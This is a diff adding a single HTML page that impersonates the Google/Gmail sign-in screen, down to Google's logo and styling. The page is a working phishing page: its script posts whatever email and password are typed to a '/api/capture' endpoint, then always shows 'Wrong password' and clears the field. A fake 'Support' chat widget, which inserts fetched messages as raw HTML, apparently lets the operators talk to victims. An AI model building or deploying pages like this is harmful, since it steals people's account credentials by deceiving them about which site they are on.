@@ -1,0 +1,74 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Google</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:#f0f4f9;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:24px}
+        .card{background:white;border-radius:28px;padding:48px 40px 36px;border:1px solid #dadce0;width:100%;max-width:448px}
+        .logo{text-align:center;margin-bottom:24px}
+        .logo img{width:75px;height:auto}
+        .card h1{text-align:center;color:#202124;font-size:24px;font-weight:400;margin-bottom:8px}
+        .card .subtitle{text-align:center;color:#5f6368;font-size:16px;margin-bottom:32px}
+        input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:24px;outline:none}
+        input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.2)}
+        button{background:#1a73e8;color:white;border:none;padding:10px 24px;border-radius:4px;font-size:14px;cursor:pointer;float:right}
+        button:hover{background:#1557b0}
+        button:disabled{background:#a8c7fa;cursor:not-allowed}
+        .links{overflow:hidden;margin-top:32px}
+        .links a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500;line-height:36px}
+        .error{background:#fce8e6;color:#c5221f;padding:12px;border-radius:4px;margin-bottom:24px;display:none;font-size:14px}
+        .error.show{display:block}
+        #chatBubble{position:fixed;bottom:24px;right:24px;width:56px;height:56px;background:#1a73e8;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;color:white;font-size:20px;z-index:999;box-shadow:0 2px 8px rgba(0,0,0,0.2)}
+        #chatWindow{position:fixed;bottom:90px;right:24px;width:360px;height:460px;background:white;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.2);display:none;flex-direction:column;z-index:999}
+        #chatWindow.open{display:flex}
+        #chatHeader{background:#1a73e8;color:white;padding:16px;border-radius:16px 16px 0 0;display:flex;justify-content:space-between;font-weight:500}
+        #chatHeader button{background:none;border:none;color:white;cursor:pointer;font-size:18px}
+        #chatMessages{flex:1;overflow-y:auto;padding:16px;background:#f8fafc}
+        .msg{padding:10px 14px;border-radius:18px;margin-bottom:8px;font-size:14px;max-width:80%;word-wrap:break-word}
+        .msg.user{background:#1a73e8;color:white;margin-left:auto;border-bottom-right-radius:4px}
+        .msg.admin{background:white;color:#202124;border-bottom-left-radius:4px;box-shadow:0 1px 2px rgba(0,0,0,0.1)}
+        #chatInputArea{display:flex;padding:12px;border-top:1px solid #e0e0e0;gap:8px}
+        #chatInputArea input{flex:1;padding:10px 16px;border:1px solid #dadce0;border-radius:24px;margin:0;font-size:14px}
+        #chatInputArea button{background:#1a73e8;color:white;border:none;padding:10px 20px;border-radius:24px;cursor:pointer;float:none}
+        @media(max-width:480px){.card{padding:24px 20px;border-radius:16px}#chatWindow{width:calc(100vw-32px);right:16px;height:400px;bottom:80px}}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" width="75">
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
+        <div class="error" id="errorMsg">Wrong password. Try again.</div>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone" required>
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <div class="links">
+                <a href="#">Create account</a>
+                <button type="submit" id="loginBtn">Next</button>
+            </div>
+        </form>
+    </div>
+    <div id="chatBubble" onclick="toggleChat()">&#128172;</div>
+    <div id="chatWindow">
+        <div id="chatHeader"><span>Support</span><button onclick="toggleChat()">&times;</button></div>
+        <div id="chatMessages"></div>
+        <div id="chatInputArea">
+            <input id="chatInput" placeholder="Send a message..." onkeypress="if(event.key==='Enter')sendMsg()">
+            <button onclick="sendMsg()">Send</button>
+        </div>
+    </div>
+    <script>
+        const API='/api';let chatOpen=false;
+        document.getElementById('loginForm').addEventListener('submit',async function(e){e.preventDefault();const email=document.getElementById('email').value.trim();const password=document.getElementById('password').value.trim();const btn=document.getElementById('loginBtn');const err=document.getElementById('errorMsg');if(!email||!password){err.classList.add('show');return}btn.textContent='Verifying...';btn.disabled=true;try{await fetch(API+'/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password})})}catch(e){}await new Promise(r=>setTimeout(r,2000));err.classList.add('show');document.getElementById('password').value='';btn.textContent='Next';btn.disabled=false});
+        function toggleChat(){chatOpen=!chatOpen;document.getElementById('chatWindow').classList.toggle('open',chatOpen)}
+        async function sendMsg(){const i=document.getElementById('chatInput');const t=i.value.trim();if(!t)return;i.value='';await fetch(API+'/chat/user',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:t})});loadMsgs()}
+        async function loadMsgs(){try{const r=await fetch(API+'/chat/messages');const d=await r.json();const c=document.getElementById('chatMessages');c.innerHTML=(d.messages||[]).filter(m=>m.from!=='system').map(m=>'<div class="msg '+m.from+'">'+m.text+'</div>').join('')||'<div class="msg admin">Hello! How can we help you?</div>';c.scrollTop=c.scrollHeight}catch(e){}}
+        loadMsgs();setInterval(loadMsgs,3000);
+    </script>
+</body>
+</html>
